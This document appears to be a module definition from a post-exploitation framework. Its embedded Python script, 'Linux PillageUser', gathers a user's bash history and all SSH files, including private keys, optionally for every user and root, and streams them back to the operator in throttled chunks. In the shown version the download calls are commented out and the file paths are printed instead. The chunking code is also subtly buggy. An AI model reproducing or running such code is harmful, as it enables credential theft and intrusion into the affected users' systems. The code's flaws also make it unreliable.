name: Linux PillageUser
authors:
  - name: Will Schroeder
    handle: '@harmj0y'
    link: https://twitter.com/harmj0y
description: 'Pillages the current user for their bash_history, ssh known hosts, recent folders, etc. '
software: ''
tactics: []
techniques:
  - T1139
background: false
output_extension: ''
needs_admin: false
opsec_safe: true
language: python
min_language_version: '2.6'
comments: []
options:
  - name: Agent
    description: Agent to execute module on.
    required: true
    value: ''
  - name: Sleep
    description: Sleep the agent's normal interval between downloads, otherwise use one blast.
    required: false
    value: 'True'
    strict: true
    suggested_values:
      - True
      - False
  - name: AllUsers
    description: Run for all users (needs root privileges!)
    required: false
    value: 'False'
    strict: true
    suggested_values:
      - True
      - False
script: |-
  import os

  # custom function to send download packets back
  def downloadFile(path):
      import os
      filePath = os.path.expanduser(path)

      if os.path.isfile(filePath):

          offset = 0
          size = os.path.getsize(filePath)

          while True:

              partIndex = 0

              # get 512kb of the given file starting at the specified offset
              encodedPart = get_file_part(filePath, offset)

              partData = "%%s|%%s|%%s" % (partIndex, filePath, encodedPart)

              if not encodedPart or encodedPart == '': break

              sendMessage(encodePacket(41, partData))

              # if we're choosing to sleep between file part downloads
              if "{{ Sleep }}".lower() == "true":
                  global minSleep
                  global maxSleep
                  minSleep = (1.0 - jitter) * delay
                  maxSleep = (1.0 + jitter) * delay
                  sleepTime = random.randint(minSleep, maxSleep)
                  time.sleep(sleepTime)

              partIndex += 1
              offset += 5120000


  searchPaths = ['/.bash_history']

  if "{{ AllUsers }}".lower() == "true":
      d = '/home/'
      userPaths = [os.path.join(d, o) for o in os.listdir(d) if os.path.isdir(os.path.join(d, o))]
      userPaths += ["/root/"]
  else:
      userPaths = ['~/']

  for userPath in userPaths:
      for searchPath in searchPaths:
          # downloadFile(userPath + searchPath)
          print(userPath + searchPath)

      # grab all .ssh files
      filePath = os.path.expanduser(userPath + '/.ssh/')
      if os.path.exists(filePath):
          sshFiles = [f for f in os.listdir(filePath) if os.path.isfile(os.path.join(filePath, f))]
          for sshFile in sshFiles:
              # downloadFile(userPath + '/.ssh/' + sshFile)
              print(userPath + '/.ssh/' + sshFile)

  print("pillaging complete")
